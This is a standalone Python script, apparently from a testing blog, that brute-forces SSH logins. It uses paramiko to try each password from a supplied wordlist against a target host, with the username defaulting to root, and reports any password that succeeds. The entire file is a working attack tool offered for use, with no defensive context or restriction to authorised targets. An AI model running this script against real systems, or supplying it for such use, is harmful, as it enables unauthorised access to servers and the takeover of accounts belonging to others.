#!/usr/bin/env python3
#=========================================================#
# [+] Title: SSH Password Brute Force                     #
# [+] Script: sshbrute_passwd.py                          #
# [+] Blog: pytesting.blogspot.com                        #
#=========================================================#

import paramiko
import socket
from optparse import OptionParser

def brute_pass(target, usr, sshport, pass_file):
    try:
        f=open(pass_file, "r")
        for pwd in f:
            pwd=pwd[:-1]
            ssh=paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(target, sshport, usr, pwd)
                print("[+] Password Found: %s"%pwd)
                break;
            except paramiko.AuthenticationException:
                print("[-] Bad Password: %s"%pwd)
                ssh.close()
            except socket.error:
                print("[-] Failed to establish a connection")
                break;
        ssh.close()
    except IOError:
        print("[-] %s file not found!"%pass_file)
    

def main():
    parser=OptionParser()
    parser.add_option("-t", "--target", dest="target", type="string",
                      help="Target to brute force the password",
                      metavar="IP/URL")
    parser.add_option("-u", "--user", dest="user", type="string",
                       help="target session username", metavar="USERNAME", default="root")
    parser.add_option("-p", "--port", dest="port", type="int",
                      help="SSH Port", metavar="Port", default=22)
    parser.add_option("-f", "--pwdfile", dest="fpwd", type="string",
                      help="Password File", metavar="txtfile")

    options, args=parser.parse_args()

    if options.target and options.fpwd:
        brute_pass(options.target, options.user, options.port, options.fpwd)
    else:
        parser.print_help()

if __name__=="__main__":
    main()



